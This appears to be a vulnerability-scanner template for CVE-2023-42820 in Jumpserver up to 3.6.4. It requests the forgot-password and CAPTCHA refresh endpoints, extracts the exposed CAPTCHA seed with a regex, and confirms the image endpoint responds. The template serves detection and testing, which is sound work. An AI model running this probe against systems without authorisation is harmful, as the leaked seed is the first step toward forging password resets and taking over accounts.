id: CVE-2023-42820
info:
  name: Jumpserver CAPTCHA Seed Exposure (CVE-2023-42820)
  author: wn147
  severity: high
  description: |
    Jumpserver <= 3.6.4 exposes the CAPTCHA PRNG seed via the image URL in the
    forgot-password flow. This template extracts the seed from /core/auth/captcha/refresh/
    and verifies direct access to the image endpoint.
  reference:
    - https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp
    - https://github.com/vulhub/vulhub/blob/master/jumpserver/CVE-2023-42820/README.md
  classification:
    cve-id: CVE-2023-42820
    cwe-id: CWE-330
  metadata:
    vendor: jumpserver
    product: jumpserver
    affected: "<= 3.6.4"
    tags: cve,cve2023,jumpserver,captcha,seed,exposure
stop-at-first-match: true

http:
  - method: GET
    path:
      - "{{BaseURL}}/core/auth/password/forget/previewing/"
      - "{{BaseURL}}/core/auth/password/forget/preview/"
    redirects: true
    max-redirects: 3

  - method: GET
    path:
      - "{{BaseURL}}/core/auth/captcha/refresh/"
    headers:
      X-Requested-With: XMLHttpRequest
      Accept: application/json, text/javascript, */*; q=0.01
      Referer: "{{BaseURL}}/core/auth/password/forget/previewing/"
      Accept-Encoding: identity
    redirects: true
    max-redirects: 2
    extractors:
      - type: regex
        name: seed
        internal: true
        group: 1
        regex:
          - "/core/auth/captcha/image/([0-9a-fA-F]{40})(?:@2)?/"

  - method: GET
    path:
      - "{{BaseURL}}/core/auth/captcha/image/{{seed}}/"
    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: header
        regex:
          - "(?i)Content-Type:\\s*image\\/"